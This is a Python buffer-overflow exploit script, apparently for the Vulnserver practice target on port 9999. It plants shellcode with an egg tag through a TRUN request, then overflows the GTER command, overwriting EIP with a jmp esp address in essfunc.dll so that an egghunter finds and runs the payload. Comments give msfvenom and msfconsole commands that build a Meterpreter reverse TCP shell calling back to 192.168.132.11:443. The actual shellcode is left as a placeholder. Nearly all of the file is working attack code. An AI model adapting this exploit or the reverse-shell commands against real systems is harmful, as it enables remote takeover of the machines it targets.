import socket
import sys
from struct import pack
import time



def main():

    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = 9999

    # Bad Char: \x2e
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.132.11 LPORT=443 -b "\x2e" -f py -v shellcode --smallest
    # msfconsole -q -x "use multi/handler;  set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.132.11; set LPORT 443; exploit"
    shellcode =  b"YOURSHELLCODE"
    

    # Store our payload using socket re-use technique
    egghunt =  b"w00tw00t" # Append egghunt "w00tw00t" to be searched by egghunter algorithm
    evilpacket = b"TRUN " 
    nops = b"\x90" * 0x10
    evilpacket += egghunt + nops + shellcode +  b"E" * (0x1000-len(egghunt)-len(egghunt) -len(nops) - len(shellcode))

    # Egghunter algorithm
    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"     # NOP sled
                b"\x66\x81\xca\xff\x0f\x42\x52\xb8"
                b"\x37\xfe\xff\xff\xf7\xd8\xcd\x2e"
                b"\x3c\x05\x5a\x74\xeb\xb8\x77\x30"
                b"\x30\x74\x89\xd7\xaf\x75\xe6\xaf"
                b"\x75\xe3\xff\xe7"
    )

    # Payload triggers buffer overlow
    buf = b"GTER \r\n" 
    buf +=  b"\x90" * (100 - len(egghunter)) + egghunter + b"\x90" * 49
    buf += pack("<L",(0x625011c7)) # (EIP Overwrite) 0x625011c7 essfunc.dll # jmp esp
    jmpback =  b"\x90\x90\x90\x90\xE9\x63\xFF\xFF\xFF" # Jump Backwards to shellcode
    buf += jmpback + b"C" * (0x1000 - len(buf) - len(jmpback))

    # Store our shellcode via re-use socket technique
    # This is required due to limit space for our shellcode
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(evilpacket)
    time.sleep(2) # Sleep allow the request above to complete.

    # Send packet to overflow the buffer and overwrite EIP.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buf)
    resp = s.recv(1024)
    print("Response: ",resp)
    s.close()


if __name__ == '__main__':
    main()